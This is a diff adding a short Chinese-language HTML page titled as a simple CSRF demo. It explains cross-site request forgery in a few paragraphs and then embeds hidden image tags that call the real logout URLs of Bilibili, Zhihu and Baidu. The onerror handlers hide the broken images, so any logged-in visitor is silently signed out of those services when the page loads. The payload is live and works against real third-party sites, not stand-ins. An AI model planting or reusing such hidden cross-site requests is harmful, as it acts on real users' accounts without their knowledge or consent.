@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>一个简单的CSRF Demo</title>
+</head>
+<body>
+    <h1>CSRF漏洞：</h1>
+    <p>CSRF（Cross-site request forgery）跨站请求伪造：也被称为“One Click Attack”或者Session Riding.</p>
+    <p>通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。</p>
+    <p>尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。</p>
+    <p>与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。</p>
+
+    <!--哔哩哔哩-->
+    <img src="https://account.bilibili.com/login?act=exit" onerror="this.style.display='none'"/>
+    <!--知乎-->
+    <img src="https://www.zhihu.com/logout" onerror="this.style.display='none'"/>
+    <!--百度-->
+    <img src="http://passport.baidu.com/?logout&tpl=mn&u=" onerror="this.style.display='none'"/>
+
+    <img src="https://picgoo.oss-cn-hangzhou.aliyuncs.com/background/%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99.jpg"/>
+
+
+
+</body>
+</html>
